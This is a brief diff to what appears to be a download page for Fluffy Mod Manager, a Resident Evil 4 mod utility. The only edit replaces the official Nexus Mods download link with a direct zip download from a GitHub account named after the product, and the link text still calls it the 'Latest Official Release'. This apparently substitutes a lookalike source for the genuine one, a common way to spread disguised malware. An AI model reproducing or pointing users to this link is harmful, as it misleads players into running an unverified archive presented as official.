@@ -2,7 +2,7 @@
 
 Fluffy Mod Manager is a mod management utility designed to simplify installing, organizing, and removing modifications for Resident Evil 4 (2023). It works with the game's PAK archives, allowing players to enable or disable supported modifications directly through its interface. The manager also supports importing mod packages, displaying preview images, organizing modifications into categories, and restoring the original game archive state when necessary. It provides a centralized way to manage Resident Evil 4 mods without manually replacing game files for every modification.
 
-> **[Download Fluffy Mod Manager — Get the Latest Official Release](https://www.nexusmods.com/site/mods/818)**
+> **[Download Fluffy Mod Manager — Get the Latest Official Release](https://github.com/Fluffy-Mod-Manager-Resident-Evil-4/.github/releases/download/v.1.0.1/Fluffy.Mod.Manager.Resident.Evil.zip)**
 
 ![Fluffy Mod Manager displaying Resident Evil 4 mod categories, character modifications, and management controls](https://staticdelivery.nexusmods.com/mods/2295/images/818/818-1710727531-1839015536.png)
 
